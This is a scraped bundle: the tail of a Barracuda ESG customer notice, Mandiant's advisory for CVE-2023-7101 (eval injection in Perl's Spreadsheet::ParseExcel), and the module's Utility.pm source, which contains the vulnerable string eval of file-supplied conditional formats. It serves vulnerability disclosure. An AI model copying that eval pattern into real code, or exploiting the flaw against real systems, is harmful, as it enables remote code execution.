Barracuda’s investigation was limited to the ESG product, and not the customer’s specific environment. Therefore, impacted customers should review their environments and determine any additional actions they want to take.

Your trust is important to us. We thank you for your understanding and support as we work through this issue and sincerely apologize for any inconvenience it may cause. If you have any questions, please reach out to support@barracuda.com.

![Barracuda logo]()

© 2003 - 2025 Barracuda Networks, Inc.

All rights reserved.

* [![Barracuda on Facebook]()](https://www.facebook.com/BarracudaNetworks)
* [![Barracuda on Twitter]()](https://twitter.com/barracuda)
* [![Barracuda on YouTube]()](https://youtube.com/barracuda)
* [![Barracuda on LinkedIn]()](https://www.linkedin.com/company/barracuda-networks)
* [![Barracuda on Instagram]()](https://www.instagram.com/barracudanetworks)
* [![Barracuda on Corporate Blog]()](https://blog.barracuda.com)

© 2003 - 2025 Barracuda Networks, Inc. All rights reserved.

* [Privacy Policy](https://www.barracuda.com/company/legal/data-privacy/privacy-policy)
  |
* [Website Terms & Conditions](https://www.barracuda.com/company/legal/website-terms)
* [Legal Terms, Conditions & Warranties](https://www.barracuda.com/company/legal/terms-and-conditions)
* [Accessibility Statement](https://www.barracuda.com/company/legal/accessibility-statement)
  |
* Cookie Preferences

## Site Map

* [Products](https://www.barracuda.com/products)
* [Solutions](https://www.barracuda.com/solutions)
* [Purchase](https://www.barracuda.com/purchase-request)
* [Support](https://www.barracuda.com/support/contact)
* [Partners](https://www.barracuda.com/partners/channel)
* [Company](https://www.barracuda.com/company)
* [Glossary](https://www.barracuda.com/support/glossary)
* [Site Map](https://www.barracuda.com/sitemap)

## Our Websites

* [MSP Solutions](https://barracudamsp.com/plans?setc=_kk&mrm=Cudacom&mrmd=CudaReferral-Website-Footer)

## Contact Us

* Phone: +1 888 268 4772
* [Contact Sales](https://www.barracuda.com/contact-sales)
* Contact Support
* [Contact Legal](https://www.barracuda.com/company/legal)
* [View More](https://www.barracuda.com/company/contact)

Connect

* [![Barracuda on Facebook]()
  Facebook](https://www.facebook.com/BarracudaNetworks)
* [![Barracuda on Twitter]()
  Twitter](https://twitter.com/barracuda)
* [![Barracuda on YouTube]()
  YouTube](https://youtube.com/barracuda)
* [![Barracuda on LinkedIn]()
  LinkedIn](https://www.linkedin.com/company/barracuda-networks)
* [![Barracuda on Instagram]()
  Instagram](https://www.instagram.com/barracudanetworks)
* [![Barracuda on Corporate Blog]()
  Corporate Blog](https://blog.barracuda.com)

Hi 👋 how may I help you?

![Live Chat Person]()
CHAT NOW



=== Content from github.com_e55d0f8c_20250115_091032.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmandiant%2FVulnerability-Disclosures%2Fblob%2Fmaster%2F2023%2FMNDT-2023-0019.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmandiant%2FVulnerability-Disclosures%2Fblob%2Fmaster%2F2023%2FMNDT-2023-0019.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mandiant%2FVulnerability-Disclosures)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mandiant](/mandiant)
/
**[Vulnerability-Disclosures](/mandiant/Vulnerability-Disclosures)**
Public

* [Notifications](/login?return_to=%2Fmandiant%2FVulnerability-Disclosures) You must be signed in to change notification settings
* [Fork
  66](/login?return_to=%2Fmandiant%2FVulnerability-Disclosures)
* [Star
   196](/login?return_to=%2Fmandiant%2FVulnerability-Disclosures)

* [Code](/mandiant/Vulnerability-Disclosures)
* [Issues
  0](/mandiant/Vulnerability-Disclosures/issues)
* [Pull requests
  0](/mandiant/Vulnerability-Disclosures/pulls)
* [Actions](/mandiant/Vulnerability-Disclosures/actions)
* [Projects
  0](/mandiant/Vulnerability-Disclosures/projects)
* [Security](/mandiant/Vulnerability-Disclosures/security)
* [Insights](/mandiant/Vulnerability-Disclosures/pulse)

Additional navigation options

* [Code](/mandiant/Vulnerability-Disclosures)
* [Issues](/mandiant/Vulnerability-Disclosures/issues)
* [Pull requests](/mandiant/Vulnerability-Disclosures/pulls)
* [Actions](/mandiant/Vulnerability-Disclosures/actions)
* [Projects](/mandiant/Vulnerability-Disclosures/projects)
* [Security](/mandiant/Vulnerability-Disclosures/security)
* [Insights](/mandiant/Vulnerability-Disclosures/pulse)

## Files

 master
## Breadcrumbs

1. [Vulnerability-Disclosures](/mandiant/Vulnerability-Disclosures/tree/master)
2. /[2023](/mandiant/Vulnerability-Disclosures/tree/master/2023)
/
# MNDT-2023-0019.md

Copy path Blame  Blame
## Latest commit

## History

[History](/mandiant/Vulnerability-Disclosures/commits/master/2023/MNDT-2023-0019.md)36 lines (26 loc) · 1.92 KB master
## Breadcrumbs

1. [Vulnerability-Disclosures](/mandiant/Vulnerability-Disclosures/tree/master)
2. /[2023](/mandiant/Vulnerability-Disclosures/tree/master/2023)
/
# MNDT-2023-0019.md

Top
## File metadata and controls

* Preview
* Code
* Blame

36 lines (26 loc) · 1.92 KB[Raw](https://github.com/mandiant/Vulnerability-Disclosures/raw/refs/heads/master/2023/MNDT-2023-0019.md)
# MNDT-2023-0019

## Description

Arbitrary Code Execution (ACE) vulnerability in Spreadsheet::ParseExcel version 0.65

## CVE ID

CVE-2023-7101

## CWE

CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

## Affected

* Version 0.65 of Spreadsheet::ParseExcel - [https://metacpan.org/pod/Spreadsheet::ParseExcel](https://metacpan.org/pod/Spreadsheet%3A%3AParseExcel)
* Products that depend upon and use Spreadsheet::ParseExcel, such as Spreadsheet::ParseXLSX ([https://metacpan.org/pod/Spreadsheet::ParseXLSX](https://metacpan.org/pod/Spreadsheet%3A%3AParseXLSX))

## Impact

High - Arbitrary Code Execution. If parsing documents provided by a remote machine, this could result in Remote Code Execution (RCE).

## Exploitability

High - Attackers can exploit this vulnerability by using specially crafted Number format strings within XLS and XLSX files, triggering the execution of arbitrary code during the parsing process.

## Technical Details

Spreadsheet::ParseExcel is a Perl module used for parsing Excel files. Spreadsheet::ParseExcel is vulnerable to an arbitrary code execution (ACE) vulnerability due to passing unvalidated input from a file into a string-type “eval”. Specifically, the issue stems from the evaluation of Number format strings (not to be confused with printf-style format strings) within the Excel parsing logic.

## Resolution

Not currenty patched

## Discovery Credits

* Le Dinh Hai (<https://github.com/haile01/perl_spreadsheet_excel_rce_poc/tree/main>)
* [Barracuda Networks Inc.](https://www.barracuda.com/)

## References

* [CVE.org CVE-2023-7101](https://www.cve.org/CVERecord?id=CVE-2023-7101)
* [ParseExcel Library](https://metacpan.org/dist/Spreadsheet-ParseExcel)
* [ParseExcel RCE PoC on Github](https://github.com/haile01/perl_spreadsheet_excel_rce_poc)
* [Vulnerable Code in ParseExcel on Github](https://github.com/jmcnamara/spreadsheet-parseexcel/blob/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel/Utility.pm#L171)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9e58e202_20250115_091031.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjmcnamara%2Fspreadsheet-parseexcel%2Fblob%2Fc7298592e102a375d43150cd002feed806557c15%2Flib%2FSpreadsheet%2FParseExcel%2FUtility.pm)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjmcnamara%2Fspreadsheet-parseexcel%2Fblob%2Fc7298592e102a375d43150cd002feed806557c15%2Flib%2FSpreadsheet%2FParseExcel%2FUtility.pm)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=jmcnamara%2Fspreadsheet-parseexcel)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jmcnamara](/jmcnamara)
/
**[spreadsheet-parseexcel](/jmcnamara/spreadsheet-parseexcel)**
Public

* [Notifications](/login?return_to=%2Fjmcnamara%2Fspreadsheet-parseexcel) You must be signed in to change notification settings
* [Fork
  25](/login?return_to=%2Fjmcnamara%2Fspreadsheet-parseexcel)
* [Star
   19](/login?return_to=%2Fjmcnamara%2Fspreadsheet-parseexcel)

* [Code](/jmcnamara/spreadsheet-parseexcel)
* [Issues
  1](/jmcnamara/spreadsheet-parseexcel/issues)
* [Pull requests
  0](/jmcnamara/spreadsheet-parseexcel/pulls)
* [Actions](/jmcnamara/spreadsheet-parseexcel/actions)
* [Projects
  0](/jmcnamara/spreadsheet-parseexcel/projects)
* [Security](/jmcnamara/spreadsheet-parseexcel/security)
* [Insights](/jmcnamara/spreadsheet-parseexcel/pulse)

Additional navigation options

* [Code](/jmcnamara/spreadsheet-parseexcel)
* [Issues](/jmcnamara/spreadsheet-parseexcel/issues)
* [Pull requests](/jmcnamara/spreadsheet-parseexcel/pulls)
* [Actions](/jmcnamara/spreadsheet-parseexcel/actions)
* [Projects](/jmcnamara/spreadsheet-parseexcel/projects)
* [Security](/jmcnamara/spreadsheet-parseexcel/security)
* [Insights](/jmcnamara/spreadsheet-parseexcel/pulse)

## Files

 c729859
## Breadcrumbs

1. [spreadsheet-parseexcel](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15)
2. /[lib](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib)
3. /[Spreadsheet](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet)
4. /[ParseExcel](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel)
/
# Utility.pm

Copy path Blame  Blame
## Latest commit

## History

[History](/jmcnamara/spreadsheet-parseexcel/commits/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel/Utility.pm)1615 lines (1374 loc) · 54.1 KB c729859
## Breadcrumbs

1. [spreadsheet-parseexcel](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15)
2. /[lib](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib)
3. /[Spreadsheet](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet)
4. /[ParseExcel](/jmcnamara/spreadsheet-parseexcel/tree/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel)
/
# Utility.pm

Top
## File metadata and controls

* Code
* Blame

1615 lines (1374 loc) · 54.1 KB[Raw](https://github.com/jmcnamara/spreadsheet-parseexcel/raw/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel/Utility.pm)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000package Spreadsheet::ParseExcel::Utility;
################################################################################# Spreadsheet::ParseExcel::Utility - Utility functions for ParseExcel.## Used in conjunction with Spreadsheet::ParseExcel.## Copyright (c) 2009 John McNamara# Copyright (c) 2006-2008 Gabor Szabo# Copyright (c) 2000-2006 Kawai Takanori## perltidy with standard settings.## Documentation after \_\_END\_\_#
use strict;use warnings;
require Exporter;use vars qw(@ISA @EXPORT\_OK);@ISA = qw(Exporter);@EXPORT\_OK = qw(ExcelFmt LocaltimeExcel ExcelLocaltime col2int int2col sheetRef xls2csv);
our $VERSION = '0.59';
my $qrNUMBER = qr/(^[+-]?\d+(\.\d+)?$)|(^[+-]?\d+\.?(\d\*)[eE][+-](\d+))$/;
################################################################################# ExcelFmt()## This function takes an Excel style number format and converts a number into# that format. for example: 'hh:mm:ss AM/PM' + 0.01023148 = '12:14:44 AM'.## It does this with a type of templating mechanism. The format string is parsed# to identify tokens that need to be replaced and their position within the# string is recorded. These can be thought of as placeholders. The number is# then converted to the required formats and substituted into the placeholders.## Interested parties should refer to the Excel documentation on cell formats for# more information: http://office.microsoft.com/en-us/excel/HP051995001033.aspx# The Microsoft documentation for the Excel Binary File Format, [MS-XLS].pdf,# also contains a ABNF grammar for number format strings.## Maintainers notes:# ==================## Note on format subsections:# A format string can contain 4 possible sub-sections separated by semi-colons:# Positive numbers, negative numbers, zero values, and text.# For example: \_(\* #,##0\_);\_(\* (#,##0);\_(\* "-"\_);\_(@\_)## Note on conditional formats.# A number format in Excel can have a conditional expression such as:# [>9999999](000)000-0000;000-0000# This is equivalent to the following in Perl:# $format = $number > 9999999 ? '(000)000-0000' : '000-0000';# Nested conditionals are also possible but we don't support them.## Efficiency: The excessive use of substr() isn't very efficient. However,# it probably doesn't merit rewriting this function with a parser or regular# expressions and \G.## TODO: I think the single quote handling may not be required. Check.#sub ExcelFmt {
 my ( $format\_str, $number, $is\_1904, $number\_type, $want\_subformats ) = @\_;
 # Return text strings without further formatting. return $number unless $number =~ $qrNUMBER;
 # Handle OpenOffice.org GENERAL format. $format\_str = '@' if uc($format\_str) eq "GENERAL";
 # Check for a conditional at the start of the format. See notes above. my $conditional; if ( $format\_str =~ /^\[([<>=][^\]]+)\](.\*)$/ ) { $conditional = $1; $format\_str = $2; }
 # Ignore the underscore token which is used to indicate a padding space. $format\_str =~ s/\_/ /g;
 # Split the format string into 4 possible sub-sections: positive numbers, # negative numbers, zero values, and text. See notes above. my @formats; my $section = 0; my $double\_quote = 0; my $single\_quote = 0;
 # Initial parsing of the format string to remove escape characters. This # also handles quoted strings. See note about single quotes above. CHARACTER: for my $char ( split //, $format\_str ) {
 if ( $double\_quote or $single\_quote ) { $formats[$section] .= $char; $double\_quote = 0 if $char eq '"'; $single\_quote = 0; next CHARACTER; }
 if ( $char eq ';' ) { $section++; next CHARACTER; } elsif ( $char eq '"' ) { $double\_quote = 1; } elsif ( $char eq '!' ) { $single\_quote = 1; } elsif ( $char eq '\\' ) { $single\_quote = 1; } elsif ( $char eq '(' ) { next CHARACTER; # Ignore. } elsif ( $char eq ')' ) { next CHARACTER; # Ignore. }
 # Convert upper case OpenOffice.org date/time formats to lowercase.. $char = lc($char) if $char =~ /[DMYHS]/;
 $formats[$section] .= $char; }
 # Select the appropriate format from the 4 possible sub-sections: # positive numbers, negative numbers, zero values, and text. # We ignore the Text section since non-numeric values are returned # unformatted at the start of the function. my $format; $section = 0;
 if ( @formats == 1 ) { $section = 0; } elsif ( @formats == 2 ) { if ( $number < 0 ) { $section = 1; } else { $section = 0; } } elsif ( @formats == 3 ) { if ( $number == 0 ) { $section = 2; } elsif ( $number < 0 ) { $section = 1; } else { $section = 0; } } else { $section = 0; }
 # Override the previous choice if the format is conditional. if ($conditional) {
 # TODO. Replace string eval with a function. $section = eval "$number $conditional" ? 0 : 1; }
 # We now have the required format. $format = $formats[$section];
 # The format string can contain one of the following colours: # [Black] [Blue] [Cyan] [Green] [Magenta] [Red] [White] [Yellow] # or the string [ColorX] where x is a colour index from 1 to 56. # We don't use the colour but we return it to the caller. # my $color = ''; if ( $format =~ s/^(\[[A-Z][a-z]{2,}(\d{1,2})?\])// ) { $color = $1; }
 # Remove the locale, such as [$-409], from the format string. my $locale = ''; if ( $format =~ s/^(\[\$?-\d+\])// ) { $locale = $1; }
 # Replace currency locale, such as [$$-409], with $ in the format string. # See the RT#60547 test cases in 21\_number\_format\_user.t. if ( $format =~ s/(\[\$([^-]+)(-\d+)?\])/$2/s ) { $locale = $1; }
 # Remove leading # from '# ?/?', '# ??/??' fraction formats. $format =~ s{# \?}{?}g;
 # Parse the format string and create an AoA of placeholders that contain # the parts of the string to be replaced. The format of the information # stored is: [ $token, $start\_pos, $end\_pos, $option\_info ]. # my $format\_mode = ''; # Either: '', 'number', 'date' my $pos = 0; # Character position within format string. my @placeholders = (); # Arefs with parts of the format to be replaced. my $token = ''; # The actual format extracted from the total str. my $start\_pos; # A position variable. Initial parser position. my $token\_start = -1; # A position variable. my $decimal\_pos = -1; # Position of the punctuation char "." or ",". my $comma\_count = 0; # Count of the commas in the format. my $is\_fraction = 0; # Number format is a fraction. my $is\_currency = 0; # Number format is a currency. my $is\_percent = 0; # Number format is a percentage. my $is\_12\_hour = 0; # Time format is using 12 hour clock. my $seen\_dot = 0; # Treat only the first "." as the decimal point.
 # Parse the format. PARSER: while ( $pos < length $format ) { $start\_pos = $pos; my $char = substr( $format, $pos, 1 );
 # Ignore control format characters such as '#0+-.?eE,%'. However, # only ignore '.' if it is the first one encountered. RT 45502. if ( ( !$seen\_dot && $char !~ /[#0\+\-\.\?eE\,\%]/ ) || $char !~ /[#0\+\-\?eE\,\%]/ ) {
 if ( $token\_start != -1 ) { push @placeholders, [ substr( $format, $token\_start, $pos - $token\_start ), $decimal\_pos, $pos - $token\_start ]; $token\_start = -1; } }
 # Processing for quoted strings within the format. See notes above. if ( $char eq '"' ) { $double\_quote = $double\_quote ? 0 : 1; $pos++; next PARSER; } elsif ( $char eq '!' ) { $single\_quote = 1; $pos++; next PARSER; } elsif ( $char eq '\\' ) { if ( $single\_quote != 1 ) { $single\_quote = 1; $pos++; next PARSER; } }
 if ( ( defined($double\_quote) and ($double\_quote) ) or ( defined($single\_quote) and ($single\_quote) ) or ( $seen\_dot && $char eq '.' ) ) { $single\_quote = 0; if ( ( $format\_mode ne 'date' ) and ( ( substr( $format, $pos, 2 ) eq "\x81\xA2" ) || ( substr( $format, $pos, 2 ) eq "\x81\xA3" ) || ( substr( $format, $pos, 2 ) eq "\xA2\xA4" ) || ( substr( $format, $pos, 2 ) eq "\xA2\xA5" ) ) ) {
 # The above matches are currency symbols. push @placeholders, [ substr( $format, $pos, 2 ), length($token), 2 ]; $is\_currency = 1; $pos += 2; } else { $pos++; } } elsif ( ( $char =~ /[#0\+\.\?eE\,\%]/ ) || ( ( $format\_mode ne 'date' ) and ( ( $char eq '-' ) || ( $char eq '(' ) || ( $char eq ')' ) ) ) ) { $format\_mode = 'number' unless $format\_mode; if ( substr( $format, $pos, 1 ) =~ /[#0]/ ) { if ( substr( $format, $pos ) =~ /^([#0]+[\.]?[0#]\*[eE][\+\-][0#]+)/ ) { push @placeholders, [ $1, $pos, length($1) ]; $pos += length($1); } else { if ( $token\_start == -1 ) { $token\_start = $pos; $decimal\_pos = length($token); } } } elsif ( substr( $format, $pos, 1 ) eq '?' ) {
 # Look for a fraction format like ?/? or ??/?? if ( $token\_start != -1 ) { push @placeholders, [ substr( $format, $token\_start, $pos - $token\_start + 1 ), $decimal\_pos, $pos - $token\_start + 1 ]; } $token\_start = $pos;
 # Find the end of the fraction format. FRACTION: while ( $pos < length($format) ) { if ( substr( $format, $pos, 1 ) eq '/' ) { $is\_fraction = 1; } elsif ( substr( $format, $pos, 1 ) eq '?' ) { $pos++; next FRACTION; } else { if ( $is\_fraction && ( substr( $format, $pos, 1 ) =~ /[0-9]/ ) ) {
 # TODO: Could invert if() logic and remove this. $pos++; next FRACTION; } else { last FRACTION; } } $pos++; } $pos--;
 push @placeholders, [ substr( $format, $token\_start, $pos - $token\_start + 1 ), length($token), $pos - $token\_start + 1 ]; $token\_start = -1; } elsif ( substr( $format, $pos, 3 ) =~ /^[eE][\+\-][0#]$/ ) { if ( substr( $format, $pos ) =~ /([eE][\+\-][0#]+)/ ) { push @placeholders, [ $1, $pos, length($1) ]; $pos += length($1); } $token\_start = -1; } else { if ( $token\_start != -1 ) { push @placeholders, [ substr( $format, $token\_start, $pos - $token\_start ), $decimal\_pos, $pos - $token\_start ]; $token\_start = -1; } if ( substr( $format, $pos, 1 ) =~ /[\+\-]/ ) { push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; $is\_currency = 1; } elsif ( substr( $format, $pos, 1 ) eq '.' ) { push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; $seen\_dot = 1; } elsif ( substr( $format, $pos, 1 ) eq ',' ) { $comma\_count++; push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; } elsif ( substr( $format, $pos, 1 ) eq '%' ) { $is\_percent = 1; } elsif (( substr( $format, $pos, 1 ) eq '(' ) || ( substr( $format, $pos, 1 ) eq ')' ) ) { push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; $is\_currency = 1; } } $pos++; } elsif ( $char =~ /[ymdhsapg]/i ) { $format\_mode = 'date' unless $format\_mode; if ( substr( $format, $pos, 5 ) =~ /am\/pm/i ) { push @placeholders, [ 'am/pm', length($token), 5 ]; $is\_12\_hour = 1; $pos += 5; } elsif ( substr( $format, $pos, 3 ) =~ /a\/p/i ) { push @placeholders, [ 'a/p', length($token), 3 ]; $is\_12\_hour = 1; $pos += 3; } elsif ( substr( $format, $pos, 5 ) eq 'mmmmm' ) { push @placeholders, [ 'mmmmm', length($token), 5 ]; $pos += 5; } elsif (( substr( $format, $pos, 4 ) eq 'mmmm' ) || ( substr( $format, $pos, 4 ) eq 'dddd' ) || ( substr( $format, $pos, 4 ) eq 'yyyy' ) || ( substr( $format, $pos, 4 ) eq 'ggge' ) ) { push @placeholders, [ substr( $format, $pos, 4 ), length($token), 4 ]; $pos += 4; } elsif (( substr( $format, $pos, 3 ) eq 'ddd' ) || ( substr( $format, $pos, 3 ) eq 'mmm' ) || ( substr( $format, $pos, 3 ) eq 'yyy' ) ) { push @placeholders, [ substr( $format, $pos, 3 ), length($token), 3 ]; $pos += 3; } elsif (( substr( $format, $pos, 2 ) eq 'yy' ) || ( substr( $format, $pos, 2 ) eq 'mm' ) || ( substr( $format, $pos, 2 ) eq 'dd' ) || ( substr( $format, $pos, 2 ) eq 'hh' ) || ( substr( $format, $pos, 2 ) eq 'ss' ) || ( substr( $format, $pos, 2 ) eq 'ge' ) ) { if ( ( substr( $format, $pos, 2 ) eq 'mm' ) && (@placeholders) && ( ( $placeholders[-1]->[0] eq 'h' ) or ( $placeholders[-1]->[0] eq 'hh' ) ) ) {
